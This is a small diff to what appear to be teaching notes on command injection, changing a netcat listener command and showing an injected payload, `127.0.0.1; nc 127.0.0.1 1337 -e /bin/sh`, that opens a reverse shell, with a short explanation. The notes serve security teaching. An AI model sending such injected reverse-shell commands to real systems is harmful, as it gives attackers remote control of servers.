@@ -28,7 +28,7 @@ Command injection happens when an attacker can effectively force the web servers
 * Very common thing to do: get a "reverse shell"
   * Slightly harder in the real world, since your computer needs a public ip, deal with firewalls, and NAT
   * But still, all of this can often be overcome if you can do command injection.
-  * Set a terminal listening with `nc -l 1337`
+  * Set a terminal listening with `nc -lvp 1337`
   * Send the command: `127.0.0.1; nc 127.0.0.1 1337 -e /bin/sh`
     * nc reaches out to the server we created.
     * -e says "send the input from that server to this program"
